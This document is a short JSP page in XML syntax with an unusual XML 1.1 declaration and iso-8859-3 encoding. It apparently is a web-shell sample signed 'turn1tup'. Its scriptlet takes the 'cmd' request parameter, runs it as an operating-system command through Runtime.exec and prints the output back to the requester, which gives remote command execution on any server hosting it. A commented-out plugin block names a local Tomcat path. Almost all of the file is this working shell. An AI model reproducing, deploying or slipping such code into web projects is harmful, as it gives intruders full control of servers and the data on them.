<?xml version="1.1" encoding="iso-8859-3"?>

<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">


    <jsp:directive.page contentType="text/html"/>
    <jsp:directive.page import="java.util.*,java.io.*"/>
    <jsp:declaration>

    </jsp:declaration>

    <!-- <jsp:plugin type="bean"
                     code="org.apache.jsp.index_jsp"
                     codebase="E:/turn1tup/program_java/2022.11.04_jsp/apache-tomcat-10.0.27-windows-x64/apache-tomcat-10.0.27/work/Catalina/localhost/ROOT/org/apache/jsp/index_jsp.class">


    <jsp:params>
        <jsp:param name="image" value="" />
    </jsp:params>
</jsp:plugin>-->

    <jsp:scriptlet>

out.write("I'm turn1tup111  ");
if (request.getParameter("cmd") != null) {

        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
                }
        }


</jsp:scriptlet>
    <jsp:text>

    </jsp:text>

</jsp:root>